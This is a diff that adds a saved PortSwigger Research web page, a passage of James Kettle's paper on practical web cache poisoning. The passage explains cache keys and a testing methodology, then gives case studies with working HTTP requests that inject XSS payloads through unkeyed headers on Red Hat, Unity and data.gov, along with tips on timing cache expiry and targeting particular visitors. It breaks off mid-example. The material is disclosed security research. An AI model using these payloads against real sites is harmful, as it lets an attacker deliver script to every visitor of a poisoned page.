@@ -1,0 +1,622 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <title>Practical Web Cache Poisoning | PortSwigger Research</title>
+        <meta name="description" content="In this paper I&#x27;ll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems">
+        
+<!-- Twitter data -->
+    <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Practical Web Cache Poisoning">
+    <meta name="twitter:description" content="In this paper I&#x27;ll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems">
+<meta name="twitter:image" content="https://portswigger.net/cms/images/d0/43/5e5ed09ea718-twittercard-cache-poisoning-article.png">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Practical Web Cache Poisoning" />
+    <meta property="og:description" content="In this paper I&#x27;ll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems">
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://portswigger.net/research/practical-web-cache-poisoning" />
+<meta property="og:image" content="https://portswigger.net/cms/images/d0/43/5e5ed09ea718-twittercard-cache-poisoning-article.png" />
+    <meta property="og:site_name" content="PortSwigger Research" />
+    <meta property="article:published_time" content="2018-08-09T23:20:00" />
+
+        <link rel="canonical" href="https://portswigger.net/research/practical-web-cache-poisoning"/>
+        <link href="/content/images/logos/favicon.ico" rel="icon" type="image/x-icon"/>
+        <link href="/content/images/logos/apple-touch-icon.png" rel="apple-touch-icon">
+        <link href="/content/psresearch.css" rel="stylesheet" type="text/css">
+        <link rel="alternate" type="application/rss+xml" href="/research/rss" title="PortSwigger Research">
+        <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="/content/fonts/ps-main/ps-icons.woff?l1la2n" as="font" crossorigin="anonymous">
+            <script nonce="l7kHb7x1uPMxhM0kvUViM6LhCSniwufz" type="text/javascript">
+        !function (t, e) {
+            var o, n, p, r;
+            e.__SV || (window.posthog && window.posthog.__loaded) || (window.posthog = e, e._i = [], e.init = function (i, s, a) {
+                function g(t, e) {
+                    var o = e.split(".");
+                    2 == o.length && (t = t[o[0]], e = o[1]), t[e] = function () {
+                        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
+                    }
+                }
+
+                (p = t.createElement("script")).type = "text/javascript", p.crossOrigin = "anonymous", p.async = !0, p.src = s.api_host.replace(".i.posthog.com", "-assets.i.posthog.com") + "/static/array.js", (r = t.getElementsByTagName("script")[0]).parentNode.insertBefore(p, r);
+                var u = e;
+                for (void 0 !== a ? u = e[a] = [] : a = "posthog", u.people = u.people || [], u.toString = function (t) {
+                    var e = "posthog";
+                    return "posthog" !== a && (e += "." + a), t || (e += " (stub)"), e
+                }, u.people.toString = function () {
+                    return u.toString(1) + ".people (stub)"
+                }, o = "init Dr qr Ci Br Zr Pr capture calculateEventProperties Ur register register_once register_for_session unregister unregister_for_session Xr getFeatureFlag getFeatureFlagPayload getFeatureFlagResult isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Jr identify setPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty Gr Hr createPersonProfile setInternalOrTestUser Wr Fr tn opt_in_capturing opt_out_capturing has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $r debug ki Yr getPageViewId captureTraceFeedback captureTraceMetric Rr".split(" "), n = 0; n < o.length; n++) g(u, o[n]);
+                e._i.push([i, s, a])
+            }, e.__SV = 1)
+        }(document, window.posthog || []);
+        posthog.init('phc_wWfgSaa3bSjrR9jrhn9eUjGxbsMftwzRCsENSman2AWL', {
+            api_host: 'https://phingest.portswigger.com',
+            defaults: '2026-01-30',
+            person_profiles: 'identified_only'
+        });
+    </script>
+
+    </head>
+    <body class="theme-research">
+        
+
+<script nonce="l7kHb7x1uPMxhM0kvUViM6LhCSniwufz">
+(function(window, document, dataLayerName, id) {
+    window[dataLayerName]=window[dataLayerName]||[],window[dataLayerName].push({start:(new Date).getTime(),event:"stg.start"});
+    var scripts=document.getElementsByTagName('script')[0],tags=document.createElement('script');
+    var qP = [];
+    dataLayerName !== "dataLayer" && qP.push("data_layer_name=" + dataLayerName), tags.nonce = "l7kHb7x1uPMxhM0kvUViM6LhCSniwufz";
+var qPString=qP.length>0?("?"+qP.join("&")):"";
+    tags.async=!0,tags.src="https://ps.containers.piwik.pro/"+id+".js"+qPString,
+    scripts.parentNode.insertBefore(tags,scripts);
+    !function(a,n,i){a[n]=a[n]||{};for(var c=0;c<i.length;c++)!function(i){a[n][i]=a[n][i]||{},a[n][i].api=a[n][i].api||function(){
+    var a=[].slice.call(arguments,0);"string"==typeof a[0]&&window[dataLayerName].push({event:n+"."+i+":"+a[0],parameters:[].slice.call(arguments,1)})}}(i[c])}(window,"ppms",["tm","cm"]);
+    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
+</script>
+        
+
+
+        <header class="page-header" id="top">
+            <div class="container">
+    <a class="logo" href="/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+                <a class="button-orange-small" href="/users">Login</a>
+        </div>
+        
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a class="mega-nav-link" href="/research"><span class="mega-nav-text">Research</span></a>
+        <a class="mega-nav-link" href="/web-security"><span class="mega-nav-text">Academy</span></a>
+        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="/about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="/blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="/careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="/legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="/contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="/users/youraccount"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="/customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="/about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="/blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="/careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="/legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="/contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="/burp/burp-at" class="link-block-white">
+                                <img src="/mega-nav/images/burp-at.svg" alt="Burp AT">
+                                <span><strong>Burp AT</strong></span>
+                                <span>Agentic AI that extends human-led pentesting.</span>
+                            </a>
+
+                            <a href="/burp/enterprise" class="link-block-white">
+                                <img src="/content/images/svg/icons/enterprise.svg" alt="Burp Suite DAST">
+                                <span><strong>Burp Suite DAST</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="/burp/pro" class="link-block-white">
+                                <img src="/content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="/burp/communitydownload" class="link-block-white">
+                                <img src="/content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="/burp" class="chevron-after">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/vulnerability-scanner">
+                                    <p><strong>Burp Scanner</strong></p>
+                                    <p>Burp Suite's web vulnerability scanner</p>
+                                    <img src="/mega-nav/images/burp-suite-scanner.jpg" alt="Burp Suite's web vulnerability scanner'">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/solutions/attack-surface-visibility" class="link-block-white">
+                                    <span><strong>Attack surface visibility</strong></span>
+                                    <span>Improve security posture, prioritize manual testing, free up time.</span>
+                                </a>
+                                <a href="/solutions/ci-driven-scanning" class="link-block-white">
+                                    <span><strong>CI-driven scanning</strong></span>
+                                    <span>More proactive security - find and fix vulnerabilities earlier.</span>
+                                </a>
+                                <a href="/solutions" class="link-block-white">
+                                    <span><strong>Application security testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="/solutions/devsecops" class="link-block-white">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="/solutions/penetration-testing" class="link-block-white">
+                                    <span><strong>Penetration testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="/solutions/automated-security-testing" class="link-block-white">
+                                    <span><strong>Automated scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="/solutions/bug-bounty-hunting" class="link-block-white">
+                                    <span><strong>Bug bounty hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="/solutions/compliance" class="link-block-white">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="/solutions" class="chevron-after">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/dast/resources/dast-vs-professional">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and DAST?</p>
+                                    <img src="/mega-nav/images/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite DAST">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="/support" class="link-block-white">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="/burp/documentation" class="link-block-white">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="/burp/documentation/desktop/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="/burp/documentation/dast/setup" class="link-block-white">
+                                    <span><strong>Get Started - DAST</strong></span>
+                                    <span>Get started with Burp Suite DAST.</span>
+                                </a>
+                                <a href="/burp/releases" class="link-block-white">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="/support" class="chevron-after">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="/burp/releases">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="/mega-nav/images/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+
+    </div>
+</div>
+        </header>
+        <nav class="navigation-top">
+            <input id="nav-main-featured-research" type="checkbox">
+            <label for="nav-main-featured-research">
+                <span>Articles</span>
+                <span class="icon-arrow-head-down"></span>
+            </label>
+            <ul>
+                
+
+                <li >
+                    <a href="/research">Overview</a>
+                </li>
+                <li >
+                    <input type="checkbox" id="nav-featured-research">
+<label for="nav-featured-research">
+    <span>Core Topics</span>
+    <span class="icon-arrow-head-down"></span>
+</label>
+    <div>
+            <a href="/research/black-hat">Black Hat</a>
+            <a href="/research/cross-site-scripting-research">XSS</a>
+            <a href="/research/request-smuggling">Request Smuggling</a>
+            <a href="/research/template-injection">Template Injection</a>
+            <a href="/research/top-10-web-hacking-techniques">Top 10 Hacking Techniques</a>
+    </div>
+
+                </li>
+                <li class = current>
+                    <a href="/research/articles">Articles</a>
+                </li>
+                <li >
+                    <input type="checkbox" id="nav-meet-the-researchers">
+<label for="nav-meet-the-researchers">
+    <span>Meet the Researchers</span>
+    <span class="icon-arrow-head-down"></span>
+</label>
+<div>
+    <a href="/research/james-kettle">James Kettle</a>
+    <a href="/research/gareth-heyes">Gareth Heyes</a>
+    <a href="/research/zakhar-fedotkin">Zakhar Fedotkin</a>
+    <a href="/research/tom-stacey">Tom Stacey</a>
+    <a href="/research/alex-craig">Alex Craig</a>
+</div>
+
+                </li>
+                <li >
+                    <a href="/research/talks">Talks</a>
+                </li>
+                <li>
+                    <a href="/research/rss">
+                        RSS <span class="icon-rss"></span>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+        <div class="wrapper">
+            
+
+
+<input id="MediaId" name="MediaId" type="hidden" value="0216C6959FAE85C27ECC7B24F9CE19DA" />
+
+
+<div class="section theme-navy-1">
+    <h1 class="heading-orange-1">Practical Web Cache Poisoning</h1>
+    <div class="container-relative-medium-content-width">
+        
+
+<div class="share-right">
+    <input id="share-button-right" type="checkbox">
+    <ul class="share-right-ul">
+        <li>
+            <a href="https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fpractical-web-cache-poisoning&text=Practical&#x2B;Web&#x2B;Cache&#x2B;Poisoning%20-%20%40PortSwiggerRes%0A" target="_blank">
+                <span class="icon-twitter"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fpractical-web-cache-poisoning" target="_blank">
+                <span class="icon-whatsapp"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fpractical-web-cache-poisoning" target="_blank">
+                <span class="icon-reddit-dark"></span>
+            </a>
+        </li>
+        <li>
+            <a href="https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fpractical-web-cache-poisoning" target="_blank">
+                <span class="icon-linkedin"></span>
+            </a>
+        </li>
+        <li>
+            <a href="mailto:?subject=Practical&#x2B;Web&#x2B;Cache&#x2B;Poisoning&body=Practical&#x2B;Web&#x2B;Cache&#x2B;Poisoning%0A%0AIn&#x2B;this&#x2B;paper&#x2B;I%27ll&#x2B;show&#x2B;you&#x2B;how&#x2B;to&#x2B;compromise&#x2B;websites&#x2B;by&#x2B;using&#x2B;esoteric&#x2B;web&#x2B;features&#x2B;to&#x2B;turn&#x2B;their&#x2B;caches&#x2B;into&#x2B;exploit&#x2B;delivery&#x2B;systems%0A%0Ahttps://portswigger.net/research/practical-web-cache-poisoning">
+                <span class="icon-email"></span>
+            </a>
+        </li>
+        <li>
+            <a href="/research/rss">
+                <span class="icon-rss"></span>
+            </a>
+        </li>
+    </ul>
+
+    <label class="share-button" for="share-button-right">
+        <span class="icon-share"></span>
+    </label>
+</div>
+
+    </div>
+    
+<div class="callout-individual-profile">
+    <img alt="James Kettle" src="/content/images/profiles/callout_james_kettle_112px.png">
+    <div>
+            <h3><a href="/research/james-kettle">James Kettle</a></h3>
+        <p>Director of Research</p>
+            <p>
+                
+<span class="icon-twitter"></span>
+<a href="https://twitter.com/albinowax">@albinowax</a>
+            </p>
+    </div>
+</div>
+
+    <ul class="publication-list">
+        <li>
+            <p><span class="icon-calendar"></span><strong>Published: </strong>Thursday, 9 August 2018 at 23:20 UTC</p>
+        </li>
+        <li>
+            <p><strong>Updated: </strong>Wednesday, 3 September 2025 at 07:37 UTC</p>
+        </li>
+        <li>
+        </li>
+    </ul>
+    <img src="/cms/images/21/ed/0358ad020c37-article-cache-poisoning-article.png"><h2 id="abstract">Abstract</h2><p><a href="/web-security/web-cache-poisoning">Web cache poisoning</a> has long been an elusive vulnerability, a 'theoretical' threat used mostly to scare developers into obediently patching issues that nobody could actually exploit. </p><p>In this paper I'll show you how to compromise websites by using esoteric web features to turn their caches into exploit delivery systems, targeting everyone that makes the mistake of visiting their homepage.</p><p> I'll illustrate and develop this technique with vulnerabilities that handed me control over numerous popular websites and frameworks, progressing from simple single-request attacks to intricate exploit chains that hijack JavaScript, pivot across cache layers, subvert social media and misdirect cloud services. I'll wrap up by discussing defense against cache poisoning, and releasing the open source Burp Suite Community extension that fueled this research.</p><p>You can also <a href="https://www.youtube.com/watch?v=j2RrmNxJZ5c" target="_blank">watch my presentation</a>&nbsp;on this research, or peruse it as a <a href="https://portswigger.net/kb/papers/7q1e9u9a/web-cache-poisoning.pdf" target="_blank">printable whitepaper</a>.</p><p class="youtube-wrapper"><iframe src="https://www.youtube.com/embed/j2RrmNxJZ5c?origin=https://portswigger.net&amp;rel=0" allowfullscreen="allowfullscreen"></iframe></p><h2 id="coreconcepts">Core Concepts</h2><h3 id="caching101">Caching 101</h3><p> To grasp cache poisoning, we'll need to take a quick look at the fundamentals of caching.  Web caches sit between the user and the application server, where they save and serve copies of certain responses. In the diagram below, we can see three users fetching the same resource one after the other: </p><img src="/cms/images/d8/e5/22a1637dd763-article-cache.svg"><p> Caching is intended to speed up page loads by reducing latency, and also reduce load on the application server. Some companies host their own cache using software like Varnish, and others opt to rely on a Content Delivery Network (CDN) like Cloudflare, with caches scattered across geographical locations. Also, some popular web applications and frameworks like Drupal have a built-in cache. </p><p>There are also other types of cache, such as client-side browser caches and DNS caches, but they're not the focus of this research. </p><h3 id="cachekeys">Cache keys</h3><p> The concept of caching might sound clean and simple, but it hides some risky assumptions.&nbsp;Whenever a cache receives a request for a resource, it needs to decide whether it has a copy of this exact resource already saved and can reply with that, or if it needs to forward the request to the application server. </p><p> Identifying whether two requests are trying to load the same resource can be tricky; requiring that the requests match byte-for-byte is utterly ineffective, as HTTP requests are full of inconsequential data, such as the requester's browser: </p><code>GET <span class="orange">/blog/post.php?mobile=1</span> HTTP/1.1<br>Host: <span class="orange">example.com</span><br>User-Agent: <span class="blue">Mozilla/5.0 … Firefox/57.0</span><br>Accept: */*; q=0.01<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: https://google.com/<br>Cookie: jessionid=xyz;<br>Connection: close</code><p> Caches tackle this problem using the concept of cache keys – a few specific components of a HTTP request that are taken to fully identify the resource being requested. In the request above, I've highlighted the values included in a typical cache key in orange. </p><p>This means that caches think the following two requests are equivalent, and will happily respond to the second request with a response cached from the first:</p><code>GET <span class="orange">/blog/post.php?mobile=1</span> HTTP/1.1<br>Host: <span class="orange">example.com</span><br>User-Agent: Mozilla/5.0 … Firefox/57.0<br>Cookie: language=<span class="blue">pl</span>;<br>Connection: close</code><code>GET <span class="orange">/blog/post.php?mobile=1</span> HTTP/1.1<br>Host: <span class="orange">example.com</span><br>User-Agent: Mozilla/5.0 … Firefox/57.0<br>Cookie: language=<span class="blue">en</span>;<br>Connection: close</code><p>As a result, the page will be served in the wrong language to the second visitor. This hints at the problem – any difference in the response triggered by an unkeyed input may be stored and served to other users. In theory, sites can use the 'Vary' response header to specify additional request headers that should be keyed. in practice, the Vary header is only used in a rudimentary way, CDNs like Cloudflare ignore it outright, and people don't even realise their application supports any header-based input. </p><p>This causes a healthy number of accidental breakages, but the fun really starts when someone intentionally sets out to exploit it.</p><h3 id="cachepoisoning">Cache Poisoning</h3><p> The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users. </p><img src="/cms/images/99/13/6505c296bdf4-article-cachepoisoningattack.svg"><p>In this paper, we're going to poison caches using unkeyed inputs like HTTP headers. This isn't the only way of poisoning caches - you can also use HTTP Response Splitting and <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn">Request Smuggling</a> - but it is the most reliable. Please note that web caches also enable a different type of attack called <a href="https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html">Web Cache Deception</a> which should not be confused with cache poisoning. </p><h3 id="methodology">Methodology</h3><p>We'll use the following methodology to find cache poisoning vulnerabilities:</p><img src="/cms/images/ec/b8/0d97faa475af-article-methodology-full-landscape.svg"><p>Rather than attempt to explain this in depth upfront, I'll give a quick overview then demonstrate it being applied to real websites. </p><p>The first step is to identify unkeyed inputs. Doing this manually is tedious so I've developed an open source Burp Suite extension called <a href="https://github.com/PortSwigger/param-miner" target="_blank">Param Miner</a> that automates this step by guessing header/cookie names, and observing whether they have an effect on the application's response. </p><p> After finding an unkeyed input, the next steps are to assess how much damage you can do with it, then try and get it stored in the cache. If that fails, you'll need to gain a better understanding of how the cache works and hunt down a cacheable target page before retrying. Whether a page gets cached may be based on a variety of factors including the file extension, content-type, route, status code, and response headers. </p><p>Cached responses can mask unkeyed inputs, so if you're trying to manually detect or explore unkeyed inputs, a cache-buster is crucial. If you have Param Miner loaded, you can ensure every request has a unique cache key by adding a parameter with a value of $randomplz to the query string. </p><p>When auditing a live website, accidentally poisoning other visitors is a perpetual hazard. Param Miner mitigates this by adding a cache buster to all outbound requests from Burp. This cache buster has a fixed value so you can observe caching behaviour yourself without it affecting other users.</p><h2 id="casestudies">Case Studies</h2><p> Let's take a look at what happens when the methodology is applied to real websites. As usual, I've exclusively targeted sites with researcher-friendly security policies. These case studies were found using the research pipeline documented in <a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank">Cracking the Lens: Targeting HTTP's hidden attack-surface</a>. All the vulnerabilities discussed here have been reported and patched, although due to 'private' programs I've been forced to redact a few.</p><p>The response from my targets was mixed; Unity patched everything swiftly and rewarded well, Mozilla at least patched quickly, and others including data.gov and Ghost did nothing for months and only patched due to the threat of imminent publication.</p><p>Many of these case studies exploit secondary vulnerabilities such as XSS in the unkeyed input, and it's important to remember that without cache poisoning, such vulnerabilities are useless as there's no reliable way to force another user to send a custom header on a cross-domain request. That's probably why they were so easy to find.<br></p><h3 id="basicpoisoning">Basic Poisoning </h3><p> In spite of its fearsome reputation, cache poisoning is often very easy to exploit. To get started, let's take a look at Red Hat's homepage. Param Miner immediately spotted an unkeyed input:</p><code>GET /en?cb=1 HTTP/1.1<br>Host: www.redhat.com<br>X-Forwarded-Host: <span class="orange">canary</span><br><br>HTTP/1.1 200 OK<br>Cache-Control: public, no-cache<br>…<br>&lt;meta property="og:image" content="https://<span class="orange">canary</span>/cms/social.png" /&gt;</code><p>Here we can see that the X-Forwarded-Host header has been used by the application to generate an Open Graph URL inside a meta tag. The next step is to explore whether it's exploitable – we'll start with a simple <a href="/web-security/cross-site-scripting">cross-site scripting</a> payload:</p><code>GET /en?dontpoisoneveryone=1 HTTP/1.1<br>Host: www.redhat.com<br>X-Forwarded-Host: <span class="orange">a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><br>HTTP/1.1 200 OK<br>Cache-Control: public, no-cache<br>…<br>&lt;meta property="og:image" content="https://<span class="orange">a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>/&gt; </code><p> Looks good – we've just confirmed that we can cause a response that will execute arbitrary JavaScript against whoever views it. The final step is to check if this response has been stored in a cache so that it'll be delivered to other users. Don't let the 'Cache Control: no-cache' header dissuade you – it's always better to attempt an attack than assume it won't work. You can verify first by resending the request without the malicious header, and then by fetching the URL directly in a browser on a different machine: </p><code>GET /en?dontpoisoneveryone=1 HTTP/1.1<br>Host: www.redhat.com<br><br>HTTP/1.1 200 OK<br>…<br>&lt;meta property="og:image" content="https://a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/&gt;</code><p> That was easy. Although the response doesn't have any headers that suggest a cache is present, our exploit has clearly been cached. A quick DNS lookup offers an explanation – www.redhat.com is a CNAME to www.redhat.com.edgekey.net, indicating that it's using Akamai's CDN. </p><h3 id="discreetpoisoning">Discreet poisoning</h3><p> At this point we've proven the attack is possible by poisoning https://www.redhat.com/en?dontpoisoneveryone=1 to avoid affecting the site's actual visitors. In order to actually poison the blog's homepage and deliver our exploit to all subsequent visitors, we'd need to ensure we sent the first request to the homepage after the cached response expired. </p><p> This could be attempted using a tool like Burp Intruder or a custom script to send a large number of requests, but such a traffic-heavy approach is hardly subtle. An attacker could potentially avoid this problem by reverse engineering the target's cache expiry system and predicting exact expiry times by perusing documentation and monitoring the site over time, but that sounds distinctly like hard work. </p><p>Luckily, many websites make our life easier. Take this cache poisoning vulnerability in unity3d.com:</p><code>GET / HTTP/1.1<br>Host: unity3d.com<br>X-Host: portswigger-labs.net<br><br>HTTP/1.1 200 OK<br>Via: 1.1 varnish-v4<br>Age: 174<br>Cache-Control: public, max-age=1800<br>…<br>&lt;script src="https://portswigger-labs.net/sites/files/foo.js"&gt;&lt;/script&gt;</code><p> We have an unkeyed input - the X-Host header – being used to generate a script import. The response headers 'Age' and 'max-age' respectively specify the age of the current response, and the age at which it will expire. Taken together, these tell us the precise second we should send our payload to ensure our response gets cached. </p><h3 id="selectivepoisoning">Selective Poisoning</h3><p> HTTP headers can provide other time-saving insights into the inner workings of caches. Take the following well-known website, which is using Fastly and sadly can't be named: </p><code>GET / HTTP/1.1<br>Host: redacted.com<br><span class="orange">User-Agent: Mozilla/5.0 … Firefox/60.0</span><br>X-Forwarded-Host: a"&gt;&lt;iframe onload=alert(1)&gt;<br><br>HTTP/1.1 200 OK<br>X-Served-By: cache-lhr6335-LHR<br><span class="orange">Vary: User-Agent</span>, Accept-Encoding<br>…<br>&lt;link rel="canonical" href="https://a"&gt;a&lt;iframe onload=alert(1)&gt;<br>&lt;/iframe&gt; </code><p> This initially looks almost identical to the first example. However, the Vary header tells us that our User-Agent may be part of the cache key, and manual testing confirms this. This means that because we've claimed to be using Firefox 60, our exploit will only be served to other Firefox 60 users. We could use a list of popular user agents to ensure most visitors receive our exploit, but this behaviour has given us the option of more selective attacks. Provided you knew their user agent, you could potentially tailor the attack to target a specific person, or even conceal itself from the website monitoring team. </p><h3 id="dompoisoning">DOM Poisoning</h3><p>Exploiting an unkeyed input isn't always as easy as pasting an XSS payload. Take the following request: </p><code>GET /dataset HTTP/1.1<br>Host: catalog.data.gov<br>X-Forwarded-Host: <span class="orange">canary</span><br><br>HTTP/1.1 200 OK<br>Age: 32707<br>X-Cache: Hit from cloudfront <br>…<br>&lt;body data-site-root="https://<span class="orange">canary</span>/"&gt;</code><p> We've got control of the 'data-site-root' attribute, but we can't break out to get XSS and it's not clear what this attribute is even used for. To find out, I created a match and replace rule in Burp to add an 'X-Forwarded-Host: id.burpcollaborator.net' header to all requests, then browsed the site. When certain pages loaded, Firefox sent a JavaScript-generated request to my server: </p><code>GET <span class="orange">/api/i18n/en</span> 